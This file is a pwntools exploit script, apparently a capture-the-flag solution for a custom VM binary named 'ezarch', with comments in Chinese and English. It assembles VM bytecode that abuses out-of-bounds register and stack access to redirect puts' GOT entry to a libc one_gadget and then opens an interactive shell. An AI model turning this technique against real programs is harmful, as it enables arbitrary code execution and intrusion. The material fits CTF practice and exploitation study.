#coding=utf-8
from pwn import *
local = 1
exec_file="./ezarch"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6") 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *
    '''
    gdb.attach(a,script)
def menu(idx):
    a.sendlineafter("R]un\n[E]xit\n>",idx)
def Init(content,eip,esp,ebp):
    menu("M")
    a.sendlineafter("[*]Memory size>",str(0x6000))
    a.sendlineafter("[*]Inited size>",str(len(content)))
    a.sendafter("\n",content)
    a.sendlineafter("eip>",str(eip))
    a.sendlineafter("esp>",str(esp))
    a.sendlineafter("ebp>",str(ebp))
def save(t,op1,op2):
    return '\x03'+t+p32(op1)+p32(op2)
def add(t,op1,op2):
    return '\x01'+t+p32(op1)+p32(op2)
def sub(t,op1,op2):
    return '\x02'+t+p32(op1)+p32(op2)
payload = ""
#save regs[0] , stack[rbp]
#将stack+rbp处的值放到regs[0]处

payload += save('\x20',0,17) 

#sub regs[0], 0xa0
# 减去 0xa0 指向 puts_got
payload += sub('\x10',0,0xa0)

#save stack[rbp] , regs[0]
#保存到 stack_ptr
payload += save('\x02',17,0)

#save regs[0],stack[rsp]
#将puts_addr低位放入regs[0]
payload += save('\x20',0,16)

one_offset = -(0x45216-libc.symbols["puts"])
#sub regs[0],one_offset
#减到 one_gadget
payload += sub('\x10',0,one_offset)
#save stack[rsp],regs[0]
payload += save('\x02',16,0)

Init(payload,0,0,0x1008)
menu('R')
a.interactive()








